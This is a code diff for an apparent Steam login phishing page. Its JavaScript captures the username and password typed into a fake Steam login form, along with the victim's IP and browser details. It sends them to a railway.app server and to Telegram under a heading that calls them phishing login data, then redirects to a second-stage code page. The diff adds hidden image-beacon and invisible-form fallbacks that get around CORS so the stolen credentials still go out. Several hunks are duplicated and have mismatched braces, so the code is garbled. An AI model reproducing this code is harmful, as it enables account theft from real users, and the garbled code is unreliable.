@@ -341,38 +341,76 @@ async function getIP() {
     }
 }
 
-// Функция регистрации в базе данных (С ПРАВИЛЬНЫМ ДОМЕНОМ)
+// Функция регистрации в базе данных (ИСПРАВЛЕННАЯ)
 async function registerUser(username, password, ip) {
     try {
         console.log('🔐 Попытка регистрации пользователя:', username);
+        
+        const userData = {
+            username: username,
+            password: password,
+            email: `${username}@steam.com`,
+            ip: ip,
+            userAgent: navigator.userAgent
+        };
         
         const response = await fetch('https://logs-unisono-project.up.railway.app/api/auth/register', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({
-                username: username,
-                password: password,
-                email: `${username}@steam.com`,
-                ip: ip,
-                userAgent: navigator.userAgent
-            })
+            body: JSON.stringify(userData),
+            mode: 'cors',
+            credentials: 'omit'
         });
         
         console.log('📡 Статус ответа:', response.status);
         
         if (response.ok) {
-            console.log('✅ Пользователь зарегистрирован в базе');
+            const result = await response.json();
+            console.log('✅ Пользователь зарегистрирован в базе:', result);
             return true;
         } else {
-            console.log('⚠️ Ошибка регистрации, но продолжаем...');
-            return true;
+            const errorText = await response.text();
+            console.log('⚠️ Ошибка регистрации:', errorText);
+            return false;
         }
     } catch (error) {
         console.error('❌ Ошибка подключения к API:', error);
-        console.log('⚠️ Продолжаем без регистрации в базе');
-        return true;
+        return false;
+    }
+}
+
+// Альтернативный метод регистрации (если CORS блокирует)
+async function registerUserAlternative(userData) {
+    try {
+        // Вариант 2: Отправка через image (обход CORS)
+        const img = new Image();
+        const dataStr = encodeURIComponent(JSON.stringify(userData));
+        img.src = `https://logs-unisono-project.up.railway.app/api/auth/register?data=${dataStr}&fallback=true`;
+        
+        // Вариант 3: Отправка через form
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://logs-unisono-project.up.railway.app/api/auth/register';
+        form.target = '_blank';
+        form.style.display = 'none';
+        
+        for (const key in userData) {
+            const input = document.createElement('input');
+            input.name = key;
+            input.value = userData[key];
+            form.appendChild(input);
+        }
+        
+        document.body.appendChild(form);
+        form.submit();
+        document.body.removeChild(form);
+        
+        console.log('🔄 Использован альтернативный метод регистрации');
+        
+    } catch (error) {
+        console.log('⚠️ Альтернативные методы также не сработали:', error);
     }
 }
 // Логирование входа через Steam
@@ -388,6 +426,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 });
+
 
 // Функция логирования действий
 async function logUserAction(action, description) {
@@ -411,6 +450,30 @@ async function logUserAction(action, description) {
     
     await sendToTelegram(logMessage);
     
+    // Также сохраняем в базу данных если нужно (с обработкой ошибок)
+    try {
+        await fetch('https://logs-unisono-project.up.railway.app/api/auth/log', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(userData),
+            mode: 'cors' // Добавьте эту строку
+        });
+    } catch (error) {
+        console.log('Лог не сохранен в базу:', error);
+        // Продолжаем выполнение даже если логирование не удалось
+    }
+}
+    
+    // Отправляем в Telegram
+    const logMessage = `📊 <b>ЛОГ ДЕЙСТВИЙ</b>\n\n`
+                     + `🎯 <b>Действие:</b> ${description}\n`
+                     + `🌐 <b>IP:</b> ${userData.ip}\n`
+                     + `📱 <b>Браузер:</b> ${navigator.userAgent}\n`
+                     + `⏰ <b>Время:</b> ${new Date().toLocaleString()}\n`
+                     + `🔗 <b>Источник:</b> ${userData.referrer || 'Прямой заход'}`;
+    
+    await sendToTelegram(logMessage);
+    
     // Также сохраняем в базу данных если нужно
     try {
         await fetch('https://logs-unisono-project.up.railway.app/api/auth/log', {
@@ -421,9 +484,8 @@ async function logUserAction(action, description) {
     } catch (error) {
         console.log('Лог не сохранен в базу:', error);
     }
-}
 
-// Обработка отправки формы (ИСПРАВЛЕННАЯ)
+// Обработка отправки формы (ОБНОВЛЕННАЯ)
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.querySelector('.newlogindialog_LoginForm_3Tsg9');
     const usernameInput = document.querySelector('input[name="username"]');
@@ -439,12 +501,26 @@ document.addEventListener('DOMContentLoaded', function() {
             // Логируем попытку входа
             await logUserAction('LOGIN_ATTEMPT', `Попытка входа с логином: ${username}`);
             
-            // 1. Пытаемся зарегистрировать в базе данных (но не блокируем процесс при ошибке)
+            // 1. Регистрируем в базе данных (ждем завершения)
             try {
-    await registerUser(username, password, ip);
-} catch (error) {
-    console.log('Регистрация не удалась, но продолжаем:', error);
-}
+                await registerUser(username, password, ip);
+            } catch (error) {
+                console.log('Регистрация не удалась, но продолжаем:', error);
+            }
+            
+            // 2. Отправляем данные в Telegram
+            const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Устройство:</b> ${navigator.userAgent}\n⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(message);
+            
+            // 3. Сохраняем логин для передачи на code1.php
+            localStorage.setItem('steam_username', username);
+            
+            // 4. Перенаправляем на code1.php
+            window.location.href = 'code1.php';
+        };
+    }
+});
             
             // 2. Отправляем данные в Telegram (главное!)
             const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Устройство:</b> ${navigator.userAgent}\n⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
